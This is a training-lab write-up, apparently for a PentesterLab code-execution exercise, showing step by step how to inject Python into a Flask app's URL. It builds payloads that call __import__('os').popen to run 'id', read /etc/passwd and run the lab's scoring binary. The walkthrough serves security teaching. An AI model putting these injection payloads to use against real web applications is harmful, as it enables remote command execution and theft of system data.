Code Execution 07

In the previous challenge, we made things a bit easier by importing os in the vulnerable application. However, we didn't for this challenge.

If we try to use os.system('id') for example. we get an error message. This is likely due to the fact that the os module (that we need to access system) is not loaded. We can use the following syntax to load and run the system function: __import__('os').system(....

Finally, by changing the call to id to the score command, you should be able to score this exercise. 

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:
/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

You can access this exercise using the following URL: http://ptc-4cf40d2a-b0ee76f3.libcurl.so/. You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-4cf40d2a-b0ee76f3.libcurl.so/. 


Common Mistakes:

  *  Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

Steps: 
1) Visit the given url:  http://ptc-4cf40d2a-b0ee76f3.libcurl.so/
2) Try with double quote (") this time we get Internal Server Error. But when we try with single quote it reflected.
  http://ptc-4cf40d2a-b0ee76f3.libcurl.so/hello/hacker"  [Now worked]
  http://ptc-4cf40d2a-b0ee76f3.libcurl.so/hello/hacker'  [Reflected]
3) A good trick in it what happen we use double quote twice.
  http://ptc-4cf40d2a-b0ee76f3.libcurl.so/hello/hacker""
4) Now add something in parameter as I add 'Anoint' 
  http://ptc-4cf40d2a-b0ee76f3.libcurl.so/hello/hacker""Anoint

  And this reflected as: Hello hackerAnoint!

5) Let's add plus(+). The thing when we add (+), server think it's a space.
    ptc-a44b2542-76e05e69.libcurl.so/hello/hacker"+""+"
    It don't break / work now.
6) Let's put 'Anoint' in between"". Lol, I mean:
    ptc-a44b2542-76e05e69.libcurl.so/hello/hacker"+"Anoint"+"
    It reflected as: Hello hackerAnoint!
7) Using some python string:
  http://ptc-4cf40d2a-b0ee76f3.libcurl.so/hello/hacker"+str(1+1)+"

8) Let's replace (1+1) with  (__import__('os').system(.... )
  Again put the system('id')
  http://ptc-4cf40d2a-b0ee76f3.libcurl.so/hello/hacker"+str(__import__('os').system('id'))+"
  We can see some changes.

9) Then, we can use popen to as .read and we can read ID of our system.
    http://ptc-4cf40d2a-b0ee76f3.libcurl.so/hello/hacker"+str(__import__('os').popen('id').read())+"
      Hello hackeruid=1000(flask) gid=1000(flask) groups=1000(flask) !
10) Okay, then let's try to read etc/passwd using cat /etc/ passwd. 
    It seems: http://ptc-4cf40d2a-b0ee76f3.libcurl.so/hello/hacker"+str(__import__('os').popen('cat /etc/passwd').read())+" And it works.
11) And now, let's try to replace 'cat/etc/password' with /usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8.
    It seems as: 
    http://ptc-4cf40d2a-b0ee76f3.libcurl.so/hello/hacker"+str(__import__('os').popen('/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8').read())+"
12) Bravo!! Hello hackerExercise completed!! !

Happy Hacking!! :) 